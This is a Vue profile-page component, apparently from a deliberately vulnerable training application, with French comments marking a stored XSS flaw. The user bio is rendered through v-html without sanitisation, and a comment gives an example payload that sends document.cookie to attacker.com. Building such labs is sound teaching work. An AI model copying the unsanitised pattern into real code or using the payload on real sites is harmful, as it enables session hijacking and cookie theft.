<script setup>
import { ref, onMounted } from 'vue'
import { useRoute } from 'vue-router'
import api from '@/services/api'

const route = useRoute()
const user = ref({})
const projects = ref([])

onMounted(async () => {
  const userId = route.params.id
  const { data: userData } = await api.get(`/users/${userId}`)
  user.value = userData

  const { data: projectData } = await api.get('/projects')
  projects.value = projectData.filter(p => p.ownerId == userId)
})
</script>

<template>
  <div class="profile">
    <div class="card mb-4">
      <div class="card-body">
        <div class="d-flex align-items-center mb-3">
          <img v-if="user.avatarUrl" :src="user.avatarUrl" class="rounded-circle me-3"
               width="80" height="80" alt="Avatar">
          <div>
            <h2>{{ user.email }}</h2>
            <span class="badge bg-secondary">{{ user.role }}</span>
          </div>
        </div>

        <!-- 🔴 A03-02 : XSS STOCKÉ — bio chargée depuis la BDD et injectée sans sanitisation -->
        <!-- Payload : <img src=x onerror="fetch('https://attacker.com?cookie='+document.cookie)"> -->
        <div class="bio" v-html="user.bio"></div>
      </div>
    </div>

    <h3>Projets</h3>
    <div class="row">
      <div v-for="project in projects" :key="project.id" class="col-md-4 mb-3">
        <div class="card">
          <div class="card-body">
            <h5>{{ project.title }}</h5>
            <p>{{ project.description }}</p>
            <router-link :to="`/project/${project.id}`" class="btn btn-sm btn-primary">
              Voir
            </router-link>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>
